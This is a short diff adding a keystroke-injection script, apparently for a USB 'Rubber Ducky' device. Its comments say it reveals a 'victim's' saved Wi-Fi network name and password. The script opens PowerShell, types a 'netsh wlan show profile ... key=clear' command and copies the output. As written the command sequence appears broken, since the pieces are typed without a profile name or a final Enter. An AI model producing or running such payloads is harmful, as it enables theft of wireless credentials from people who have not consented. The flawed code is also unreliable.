@@ -1,0 +1,16 @@
+REM this shows the victim's wifi 
+REM name and key
+REM (must  be administrator)
+DELAY 500
+win r 
+DELAY 500 
+STRING powershell 
+ENTER
+DELAY 600 
+STRING netsh wlan show profile 
+DELAY 200
+STRING key=clear 
+DELAY 100
+Ctrl a 
+DELAY 167
+Ctrl c
